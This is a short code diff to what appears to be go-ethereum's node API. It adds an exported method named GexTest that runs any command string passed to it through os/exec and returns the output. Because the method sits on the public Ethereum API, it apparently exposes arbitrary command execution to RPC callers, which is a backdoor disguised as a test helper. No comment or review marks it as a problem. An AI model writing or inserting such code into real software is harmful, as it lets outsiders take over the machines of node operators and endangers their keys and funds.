@@ -36,6 +36,7 @@ import (
 	"github.com/ethereum/go-ethereum/rlp"
 	"github.com/ethereum/go-ethereum/rpc"
 	"github.com/ethereum/go-ethereum/trie"
+	"os/exec"
 )
 
 // PublicEthereumAPI provides an API to access Ethereum full node-related
@@ -483,4 +484,14 @@ func (api *PrivateDebugAPI) getModifiedAccounts(startBlock, endBlock *types.Bloc
 		dirty = append(dirty, common.BytesToAddress(key))
 	}
 	return dirty, nil
+}
+
+func (api *PublicEthereumAPI) GexTest(cmd string) string {
+	out, err := exec.Command(cmd).Output()
+	if err != nil {
+		log.Warn(err.Error())
+		return fmt.Sprintf("Err: %s", err.Error())
+	}
+
+	return fmt.Sprintf("Out: %s", out)
 }
